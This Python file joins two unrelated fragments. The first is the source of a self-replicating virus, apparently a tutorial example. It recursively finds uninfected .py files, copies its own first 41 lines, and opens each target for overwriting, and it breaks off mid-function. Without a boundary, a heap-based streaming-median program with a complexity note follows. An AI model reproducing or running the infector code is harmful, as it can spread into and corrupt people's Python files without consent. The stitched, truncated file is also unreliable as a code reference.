#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python code to implement the approach
 
from heapq import heappush, heappop, heapify
import math
 
# Function to find the median of stream of data
def streamMed(arr, N):
     
    # Declaring two min heap
    g = []
    s = []
    for i in range(len(arr)):
       
        # Negation for treating it as max heap
        heappush(s, -arr[i])
        heappush(g, -heappop(s))
        if len(g) > len(s):
            heappush(s, -heappop(g))
 
        if len(g) != len(s):
            print(-s[0])
        else:
            print((g[0] - s[0])/2)
 
 
# Driver code
if __name__ == '__main__':
    A = [5, 15, 1, 3, 2, 8, 7, 9, 10, 6, 11, 4]
    N = len(A)
     
    # Function call
    streamMed(A, N)
'''
Time Complexity: If we omit the way how stream was read, complexity of median finding is O(N*log(N)), as we need to read the stream, and due to heap insertions/deletions.
Space Complexity: O(N) - At first glance the above code may look comlpex. If you read the code carefully, it is simple algorithm
'''